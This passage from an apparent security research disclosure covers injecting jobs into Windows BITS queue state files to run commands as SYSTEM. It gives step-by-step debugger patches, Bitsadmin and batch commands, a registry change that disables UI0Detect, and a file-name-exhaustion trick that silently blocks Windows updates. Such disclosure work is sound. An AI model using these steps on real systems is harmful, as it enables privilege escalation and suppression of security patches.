them to memory and continues with their execution. No security verification, no permission 
checks. It just trusts the state file’s contents. 
How are the objects represented in this binary opaque file? 
the state file binary structure is a clear, unencrypted and unprotected binary serialization of the 
job objects inside the queue. 
So, we found out which bytes represent our job’s state, and changed it to QUEUED according to 
this enum: 
public​ ​enum​ JOB_STATE { 
    ​Queued, 
    ​Connecting, 
    ​Transferring, 
    ​Suspended, 
    ​Error, 
    ​TransientError, 
    ​Transferred, 
    ​Acknowledged, 
    ​Cancelled, 
    ​Unknown 
}; 
From this state, ​qmgr ​treats the job as an already started one, and starts transferring the file! 
The job completed when the download has finished, and BITS took care to open a process for 
us with the command line we specified. The new process inherits the job owner’s token, thus it 
is run with ​LocalSystem​ permissions in session 0. 
In other words, we now had an interactive CMD shell opened for us as SYSTEM in 
session 0. 
All fun, but since Vista, Windows included a default mitigation that prevents services from 
opening interactive windows - ​UI0Detect​. This is a service that monitors services that try to do 
just that, and pops up a confirmation message into the active user session. This is how it looks: 
Clicking “View the message” and we are taken into session 0 with an open cmd.exe. 
So how do we get rid of this mitigation? 
Interactive or not? 
The answer is simple, and there are actually two different approaches: 
1.
choose a command line that does not require interactiveness instead of cmd.exe. 
For example, we have created a simple executable that creates a file. We specified it as 
the notification command line and the file was created as a SYSTEM file. 
2.
change the following in registry and restart ​UI0detect ​service: 
sc stop UI0Detect 
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Windows ​/​v ​NoInteractiveServices 
/​t REG_DWORD ​/​d ​1​ ​/f 
sc start UI0Detect 
Migrate your Payload 
The next thing we wanted is to similarly inject a job into another machine’s queue where we do 
not have debugging ability. Simply enough, we copied the state files (that included the SYSTEM 
job) from our machine to another with the same OS. Of course we had to first stop the BITS 
service on that remote machine, and when started off again - the job was run! 
Clearly, the state file is not machine dependant. And because the SYSTEM SID is of a 
well-known fixed value (​S-1-5-18​), not a single change is needed in the state file with the 
SYSTEM “payload” job. 
Trying the same on different versions uncovered the fact that the state file is OS version 
dependant. 
We performed the same actions above to produce a “payload” job and a state file on a Windows 
10 machine, and that allowed us to put it on other Windows 10 machines and see it works just 
the same. 
In conclusion, one can produce a state file, having any desired jobs, on a machine running a 
specific OS version and transfer it to any other machine with that same version. Just duplicate 
the production steps on a machine with another OS version, and you’ve expanded the coverage 
for that version as well. 
A Cleaner Method 
Noticed that up till now the method demanded to fully overwrite the state file? 
It bothered us because it makes this attack method too destructive to practically use - it 
overwrites all existing job on the target machine. 
So we wanted to find a way to inject jobs to the queue while keeping the others as they are. 
In order to do that, we started examining the exact structure of the state file. 
You can find the template definition file on ​SafeBreach-Labs on github​. 
To make an even easier use of these findings, we wrote a python script that injects jobs to 
current queue. You can find it here - BITSInject. 
You can provide it with a “payload” job buffer produced in the way described below (in the 
instructions section), and run it on the target machine. It will take care of both adding the job, 
waiting for it to finish, and removing it from queue afterwards. 
To keep it simple, you can copy the example payload job buffer to a target computer and run the 
script - and you have a SYSTEM shell in seconds! 
An example output of a successful injection: 
In addition, to make the method even cleaner in some attack scenarios - you can set the 
destination link of the job to a server that makes the job immediately go into error state and thus 
execute the command line without downloading any file. 
One way to do it is running a BITS server that causes an error, such as a server that replies to 
the BITS client request without the Content-Length header. Not all errors will lead to the desired 
job state. Have your go with our ​SafeBreach-Labs/SimpleBITSServer​. 
A Little Anecdote 
One little trick we found out along the way is preventing a BITS job from downloading, in cases 
we know the local destination folder in advance. The only prerequisite we need is write access 
to that target folder. 
We used this trick to cause an error whenever WU tries to download an update package 
(Windows Update Error Code ​80070050​). The error persists after restarts as well, effectively 
making a machine forever deprived of that update. 
This method also demands, of course, administrator rights but unlike simply disabling automatic 
updates, this method is hidden quite well. Even the common workaround suggested by 
Microsoft for this error code - ​resetting windows update components​ - won’t solve it. So an 
attacker with administrator rights can use it to weaken a machine’s security and open himself 
new potential exploitation doors for attack vector redundancy. 
And it is as simple as that: 
BITS uses a very limited name space for choosing a temporary file name. Before downloading 
the requested file, BITS first downloads it to a temporary hidden file. It generates this file’s name 
according to the following format (Pythonic regex): 
BIT​[​0​-​9A​-​F​]{​1​,​4​}.​tmp 
Only at job completion it is renamed to the requested destination name, and its attributes 
change to ​FILE_ATTRIBUTE_NORMAL​. It takes a simple calculation to realise that this format 
encloses only 69,904 options for the file name: 
So we choked the destination folder by creating 69,904 hidden files. This file name exhaustion 
causes BITS to fail, resulting in the above WU failure, which is not even indicative enough to 
suggest that BITS is the error origin. 
How do we know the destination folder in advance you ask? All WU updates are created here: 
C​:​\Windows\SoftwareDistribution\Download 
Each update package creates its own folder before download starts, with a GUID being its 
name. The downloaded files are then extracted and installed by ​wuaueng​. Interesting enough, 
the created folder name is global (constant across machines). So an attacker could get an 
update to its home machine as soon as it gets published, and send its GUID to the malware 
agent. The agent would then create this folder in advance, and choke it with those 69,904 
hidden files. When Windows/the user decides to install the update, ​wuaueng​ will invoke a BITS 
download job to that specific folder, that will cause the following update failure: 
Reproduction Instructions 
General Reproduction Description 
The steps performed in this method, in brief: 
1.
“Jobs Factory” - Pre-produce a serialized job with desired settings, on any machine 
running the desired OS version. 
2.
Stop BITS service 
3.
Inject job to queue:
Modify ​qmgr0.dat​, ​qmgr1.dat​ queue files, adding a pre-produced 
serialized “payload job” bytes  to the tail of the queue. 
3
4.
Start BITS service 
For better understanding of the method, it is important to state the key action that allowed us to 
produce such a job: we bypassed the logon session check that ​qmgr.dll​ performs before 
allowing significant operations on jobs. 
Normally, a user that does not have an interactive logon session, cannot perform critical 
operations on jobs such as adding files, resuming, cancelling, and more. For LocalSystem or 
other system account to perform such operations, it should be done from a running service. 
The requirement to be logged on interactively or as a service is a key phase in the enforcement 
of the job’s security integrity. 
We skipped this active session enforcement by debugging the ​qmgr ​service and in-memory 
changing of the session ID retrieved in the process. 
Next are step by step instructions on how to generate and inject a “payload” job. 
3 Same job bytes work cross-machines having the same OS version 
Step-by-step Reproduction instructions 
First we need to prepare the state files that include our “payload” SYSTEM job. The following 
steps describe how to produce a state file that has only one SYSTEM job and should be 
replaced as a whole with the target machine’s state files. 
As we said before, instead of replacing the whole state file, it is cleaner to inject job bytes to 
current queue. This can be done using the ​010 template​ that we provide here that will allow you 
to extract the job bytes. 
After extracting the “payload”, use our python script that injects a job to the current state file, 
without affecting existing jobs.  
NOTE 
Steps 1-4 below need to be performed on the attacker’s “home” computer, having the same OS 
version of the victim computer. The prepared file then needs to be transferred to the target 
computer. 
Step 5 is performed on the victim computer. 
Step 1​ - Preparations 
1.
It is recommended to stop all programs and services that might initiate a BITS job while 
we are debugging it (e.g. wuaueng). 
2.
Reset BITS state files completely: 
a.
Sc stop bits 
b.
Delete state files 
c.
Sc start bits 
Step 2​ - Debug the BITS process 
1.
Find the BITS process: 
tasklist ​/​fi​ ​"​services eq bits" 
2.
Attach windbg to the bits process, put breakpoints: 
a.
Breakpoint A​: 
bp qmgr​!​CNestedImpersonation​::​SwitchToLogonToken​+​0xe2 
Note that this offset is relevant to the qmgr.dll File Version 7.5.7600.16385, other versions may have different offsets. 
Make sure this breakpoint is placed just before the call to ​CJobManager::CloneUserToken​. 
b.
Breakpoint B: 
bp qmgr​!​CJob​::​Transfer 
Step 3​ - Create a job from SYSTEM shell 
1.
Run CMD or PowerShell as SYSTEM using psexec. The user that creates the job is the 
job owner, and a job’s access token is derived from its owner. Thus, all ​Bitsadmin.exe 
commands below should be executed from that SYSTEM shell. 
2.
Add a system job: 
Bitsadmin​ ​/​create I_WANT_YOUR_SYSTEM 
Bitsadmin​ ​/​addfile I_WANT_YOUR_SYSTEM ​""​ ​"" 
a.
We now got to breakpoint ​A​. Change the return value of the ​GetTokenInformation 
call to 0, which is the SYSTEM session ID. This value was previously acquired 
and was saved to [rsp+20h], so we need to replace both: 
r ​@rax​=​0x0 
Memory change ​[​rsp​+​20h​]=0 
b.
The CMDLINE you set below will be executed as Local System​ when the job 
finishes or ends on error: 
Bitsadmin​ ​/​setnotifycmdline I_WANT_YOUR_SYSTEM ​""​ ​"" 
c.
Prevent the job from doing retries and force it to go into fatal error state on every 
kind of error: 
Bitsadmin​ ​/​SETNOPROGRESSTIMEOUT ​0 
bitsadmin ​/​SETNOTIFYFLAGS 3 
d.
In order to get to breakpoint ​B​: 
Bitsadmin​ ​/​resume I_WANT_YOUR_SYSTEM 
e.
Got to breakpoint ​B​. We stopped just before a call to ​qmgr!CJob::Transfer​. This 
call would throw an exception in a normal flow, if we haven’t already changed the 
TokenInformation.TokenSessionId​ to 0 above. 
Step 4​ - Modify state file 
1.
Copy state file to a temporary location: 
copy C​:​\ProgramData\Microsoft\Network\Downloader\* C​:​\temp\ 
2.
Modify the state file qmgr1.dat in C:\temp to change the job status: 
a.
Change job state to QUEUED. This change is required for the state file to really 
initiate transfer, because it skips the need to resume the job. Resuming is one of 
the operations that are permitted only to the owner of the job, and since the 
owner is SYSTEM, we couldn’t perform it. 
Changing the state to queued is just the equivalent of resuming it in a normal 
interface. 
i.
Change state byte at offset 0x4C to 0x0 = ​BG_JOB_STATE_QUEUED 
b.
We can also change the SID (and length count before it) to any SID we want to 
make it appear as a user job, while it will still run as SYSTEM. 
Step 5​ - Run on target computer 
Copy C:\temp\qmgr1.dat to that same path on the victim computer. 
Continue the following steps on that victim computer. 
1.
Run the following batch as Administrator. It temporarily stops BITS and copies the state 
file we have just created to the original location used by BITS. The service maintains 2 
state files in this folder, in a kind of redundancy-backup model. So we overwrite both of 
them with the qmgr1.dat that we have just prepared. Batch: 
sc stop bits 
timeout 5 
del​ ​/​Q ​/​F C​:​\ProgramData\Microsoft\Network\Downloader\* 
copy c​:​\temp\qmgr1​.​dat C​:​\ProgramData\Microsoft\Network\Downloader\qmgr0​.​dat 
copy c​:​\temp\qmgr1​.​dat C​:​\ProgramData\Microsoft\Network\Downloader 
sc start bits 
bitsadmin ​/​list ​/​allusers ​/​verbose 
2.
The expected output of the last command should display the job we have just created, 
with owner set to ​NT AUTHORITY/SYSTEM​. It would probably already be in 
CONNECTING ​or even ​TRANSFERRING ​state, which means that BITS already started 
handling the download. A similar example output: 
When the job moves to ​TRANSFERRED ​mode, it should execute the notification command line 
(​c:\windows\system32\cmd.exe​ in the above example). This will dispatch the “Interactive 
Services Detection” message (forced by the ​UI0Detect ​service). 
As mentioned above, avoiding this message is possible by setting a non-interactive program as 
the ​/NOTIFYCMDLINE​ (tested with a simple executable that only creates a file using WinAPI 
CreateFile). 
Affected Environment Details 
The scenario explained was performed on the following environment: 
●
Windows 7 x64 Pro (6.1.7601 Service Pack 1 Build 7601) 
●
Qmgr.dll File Version: 7.5.7600.16385 (win7_rtm.090713-1255) 
It was also tested and working on: 
●
Windows 10 x64 Pro (10.0.14393 N/A Build 14393) 
●
Qmgr.dll File Version: 7.8.14393.0 (rs1_release.160715-1616) 
Note that the the serialization is different between Windows 7 and Windows 10, thus a different 
payload is needed per OS. Producing the “payload” job on different operating systems can be 
done with the exact same steps. 
The discoveries and method described here were submitted to Microsoft security center prior to 
this publication, and according to their policy, there is no intention to issue an update or prevent 
this kind of abuse.